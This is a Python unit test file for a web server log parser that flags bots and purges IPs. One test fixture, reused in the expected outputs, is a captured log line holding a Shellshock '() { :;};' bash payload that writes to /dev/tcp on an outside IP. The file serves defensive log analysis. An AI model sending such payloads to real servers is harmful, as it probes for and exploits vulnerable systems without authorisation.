#!/usr/bin/python
# -*- coding: utf-8 -*-
# UTF-8. That’s cool!
"""
LICENSE
Copyright (C) 2014-2015 Tellectual LLC

"""

import os.path
from datetime import datetime as dt

from twisted.python import failure
from twisted.internet import defer

import testbase as tb

import logread


ip1 = "221.127.9.141"
ip2 = "82.132.214.244"

NASTY_SHIT = """
2015-02-26 20:00:24+0000 [HTTPChannel,3229,68.116.30.102] 68.116.30.102 EVOLVINGOUTOFEDEN.ORG - [26/Feb/2015:20:00:24 +0000] "GET /cgi-bin/test-cgi HTTP/1.1" 302 234 "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/udp/23.227.199.185/80\"" "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi > /dev/udp/23.227.199.185/80\"
""".strip()


class TestParser(tb.TestCase):
    def setUp(self):
        self.p = logread.Parser({})
        self.p.rk.purgeIP = self.fakePurge
        self.ipList = []

    def fakePurge(self, ip):
        self.ipList.append(ip)

    def test_parseDatetimeBlock(self):
        textExpected = (
            ("20/Feb/2015:12:02:49 +0000", dt(2015, 2, 20, 12, 2, 49)),
            ("2/Jan/2015:21:17:16 +0000", dt(2015, 1, 2, 21, 17, 16)),
            ("07/Sep/2014:06:46:34 -0400", dt(2014, 9, 7, 6, 46, 34)))
        for text, dtExpected in textExpected:
            self.failUnlessEqual(self.p.parseDatetimeBlock(text), dtExpected)
            
    def test_parseLine(self):
        textExpected = (
            ('64.233.172.98 freedomtodoubt.com - [07/Sep/2014:06:46:34 -0400] '+\
             '"GET /ftd.css HTTP/1.1" 200 1238 "http://freedomtodoubt.com/" '+\
             '"Mozilla/5.0 (Linux; U; Android 4.3; en-us; SPH-L710 Build/JSS15J) '+\
             'AppleWebKit/534.30 (KHTML, like Gecko) '+\
             'Version/4.0 Mobile Safari/534.30"',
             ["freedomtodoubt.com",
              "64.233.172.98",
              dt(2014, 9, 7, 6, 46, 34),
              "/ftd.css",
              200,
              "http://freedomtodoubt.com/",
              "Mozilla/5.0 (Linux; U; Android 4.3; en-us; SPH-L710 Build/JSS15J) "+\
              "AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile " +\
              "Safari/534.30"]),
            (NASTY_SHIT,
             ["evolvingoutofeden.org",
              "68.116.30.102",
              dt(2015, 02, 26, 20, 0, 24),
              "/cgi-bin/test-cgi",
              302,
              "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi "+\
              "> /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/"+\
              "test-cgi > /dev/udp/23.227.199.185/80\"",
              "() { :;}; /bin/bash -c \"echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/test-cgi "+\
              "> /dev/tcp/23.227.199.185/80; echo EVOLVINGOUTOFEDEN.ORG/cgi-bin/"+\
              "test-cgi > /dev/udp/23.227.199.185/80"])
        )
        for text, expected in textExpected:
            self.assertItemsEqual(self.p.parseLine(text), expected)

    def test_parse_nastyShit(self):
        dtp, record = self.p.makeRecord(NASTY_SHIT)
        self.assertEqual(dtp, dt(2015, 02, 26, 20, 0, 24))
        dtp, record = self.p.makeRecord(NASTY_SHIT)
        self.assertEqual(dtp, dt(2015, 02, 26, 20, 0, 24))
            
    def test_makeRecord(self):
        def mr(*args):
            stuff = stuffBase + list(args)
            return self.p.makeRecord(stuff, alreadyParsed=True)

        def uaMatcher(ip, ua):
            return ua.endswith('bot')

        def botMatcher(ip, url):
            if ".php" in url:
                return True
            return False

        # Empty line
        self.assertNone(self.p.makeRecord(""))
        # Excluded codes
        dtStuff = dt(2015, 1, 1, 12, 30)
        stuffBase = ["foo.com", ip1, dtStuff, "/"]
        self.p.exclude = [400, 404]
        for http, expectReject in (
                (200, False), (301, False), (400, True), (404, True)):
            result = mr(http, "-", "-")
            if expectReject:
                self.assertNone(result, http)
            else:
                self.assertNotNone(result, http)
        self.p.exclude = []
        for http in (200, 301, 400, 404):
            self.assertNotNone(mr(http, "-", "-"))
        stuffBase.append(200)
        # Excluded UA
        x = self.p.uaMatcher
        self.p.uaMatcher = uaMatcher
        self.assertNotNone(mr("-", "Mozilla innocent browser/1.2"))
        self.assertNone(mr("-", "I am a bot"))
        self.p.uaMatcher = x
        # Excluded URL
        x = self.p.botMatcher
        stuffBase = stuffBase[:-2]
        tail = [200, "-", "Mozilla innocent browser/1.2"]
        self.p.botMatcher = botMatcher
        # ... innocent URL
        self.assertNotNone(mr("/", *tail))
        self.assertEqual(self.ipList, [])
        # ... malicious URL
        self.assertNone(mr("/foo/wp-login.php", *tail))
        self.assertEqual(self.ipList, [ip1])
        self.p.botMatcher = x
        # Innocent record
        dtTest, record = mr(
            "/index.html", 302,
            "http://greatsite.com/", "Awesome browser/2.3")
        self.assertEqual(dtTest, dtStuff)
        self.assertIsInstance(record, dict)
        self.assertTrue(len(record) > 5)

                           
class TestReader(tb.TestCase):
    def setUp(self):
        import sift
        self.r = logread.Reader(
            os.path.join(tb.moduleDir(parent=True), 'log'),
            "sqlite://", cores=1, verbose=False)
        self.t = self.r.rk.trans

    def test_complains(self):
        self.assertRaises(OSError, logread.Reader, 'bogusdir')

    def test_run(self):
        @defer.inlineCallbacks
        def done(result):
            if isinstance(result, failure.Failure):
                result.raiseException()
            else:
                ipList = result
                self.assertIsInstance(ipList, list)
                self.assertTrue(len(ipList) > 1)
                Ne = 2; N = yield self.t.hitsForIP("98.190.155.57")
                # Why do I get N=0?
                msg = "Expected at least {:d} records, got {:d}".format(Ne, N)
                self.assertGreater(N, Ne, msg)
                yield self.r.done()
        
        rules = {'BotMatcher': tb.RULES_BOT}
        return self.r.run(
            rules, vhost="evolvingoutofeden.com").addCallback(done)

        

            
